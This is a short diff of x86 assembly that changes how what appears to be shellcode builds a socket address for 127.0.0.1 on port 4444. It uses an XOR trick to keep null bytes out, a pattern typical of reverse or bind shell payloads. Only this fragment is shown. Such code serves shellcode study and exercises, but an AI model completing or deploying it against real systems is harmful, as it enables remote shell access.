@@ -13,9 +13,10 @@ section .text
     ; create sockaddr_in struct
     push  eax
     push  eax             ; [$esp]: 8 bytes of padding
-    mov edi, 0xfeffff80 ; xor of 0x0100007f and 0xffffffff
-    xor edi, 0xffffffff
-    push edi              ; [$esp]: 127.0.0.1          
+    mov   eax, 0xffffffff
+    mov   ebx, 0xfeffff80
+    xor   ebx, eax
+    push  ebx             ; [$esp]: 127.0.0.1
     push  word 0x5c11     ; [$esp]: 4444
     push  word 0x02       ; [$esp]: AF_INET
 
